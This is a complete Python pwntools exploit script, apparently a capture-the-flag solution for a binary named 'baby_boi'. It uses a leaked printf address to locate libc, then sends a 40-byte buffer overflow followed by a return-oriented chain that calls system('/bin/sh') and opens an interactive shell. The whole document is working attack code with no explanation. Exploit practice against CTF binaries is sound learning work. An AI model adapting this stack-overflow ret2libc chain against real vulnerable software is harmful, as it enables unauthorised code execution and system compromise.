from pwn import *

p = process(["./baby_boi_patched"])

libc = ELF("./libc-2.27.so",checksec=False)

p.recvuntil(b"I am: ")
leak = int(p.recvuntil(b"\n",drop=True),16)

libc.address = leak - libc.symbols['printf']
one_gadget = libc.address + 0x4f322
pop_rdi = 0x0000000000400793
ret = 0x000000000040054e

libc_system = libc.symbols["system"]
libc_binsh = next(libc.search(b"/bin/sh\x00"))

log.success("Libc Base: " + hex(libc.address))
log.success("Libc one_gadget: " + hex(one_gadget))
log.success("Libc system: " + hex(libc_system))
log.success("Libc binsh: " + hex(libc_binsh))

payload = b'A'*40
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(libc_binsh)
payload += p64(libc_system)

p.sendline(payload)

p.interactive()